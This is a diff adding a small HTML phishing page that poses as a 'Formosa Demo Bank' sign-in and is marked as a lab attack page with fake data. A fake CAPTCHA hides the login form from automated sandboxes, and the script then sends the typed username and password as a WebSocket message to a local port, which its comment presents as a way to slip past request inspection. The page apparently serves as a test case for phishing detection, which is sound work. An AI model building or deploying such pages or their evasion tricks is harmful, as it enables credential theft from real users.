@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Formosa Demo Bank - Secure sign-in</title></head>
+<body>
+  <h1>Formosa Demo Bank</h1>
+  <p style="color:#a00">LAB ATTACK PAGE - CAPTCHA gate, then login over a WebSocket. Fake data only.</p>
+  <div id="slot"><button type="button" id="captcha">I'm not a robot</button></div>
+
+  <script>
+    // The CAPTCHA gates the real form (a sandbox that can't solve it sees only this).
+    document.getElementById("captcha").addEventListener("click", () => {
+      document.getElementById("slot").innerHTML =
+        '<input name="username" placeholder="Username">' +
+        '<input name="password" type="password" placeholder="Password">' +
+        '<button type="button" id="login">Log in</button>';
+      document.getElementById("login").addEventListener("click", () => {
+        const u = document.querySelector('input[name="username"]').value;
+        const p = document.querySelector('input[name="password"]').value;
+        // Exfiltrate over a WebSocket MESSAGE (not a request body or URL).
+        const ws = new WebSocket("ws://127.0.0.1:8004");
+        ws.onopen = () => { ws.send("username=" + u + "&password=" + p); };
+      });
+    });
+  </script>
+</body></html>
